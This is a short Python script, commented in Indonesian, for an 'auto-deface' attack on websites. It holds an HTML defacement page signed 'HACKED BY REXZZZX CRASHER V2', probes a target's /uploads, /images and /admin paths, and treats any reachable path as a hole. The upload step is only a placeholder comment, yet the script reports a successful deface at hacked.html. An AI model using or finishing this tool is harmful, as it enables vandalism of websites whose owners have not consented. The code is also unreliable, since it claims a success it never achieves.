import os
import requests
from bs4 import BeautifulSoup

class DefaceModule:
    def __init__(self):
        self.payload = """
<!DOCTYPE html>
<html>
<body style="background:black;color:red">
  <h1>HACKED BY REXZZZX CRASHER V2</h1>
  <img src="https://files.catbox.moe/omd6uc.png">  
</body>
</html>
"""
        
    def auto_upload(self, url):
        # Teknik upload otomatis
        try:
            vuln_paths = ['/uploads', '/images', '/admin']
            for path in vuln_paths:
                target = f"{url}{path}"
                response = requests.get(target)
                if response.status_code == 200:
                    print(f"[+] Vuln path ditemukan: {target}")
                    # Proses upload...
                    return True
        except Exception as e:
            print(f"Error: {e}")
        return False
        
    def run(self):
        print("[+] Mode Auto-Deface")
        url = input("URL target (contoh: http://example.com): ")
        if self.auto_upload(url):
            print(f"[+] Berhasil! Cek: {url}/hacked.html")
        else:
            print("[-] Gagal menemukan celah")
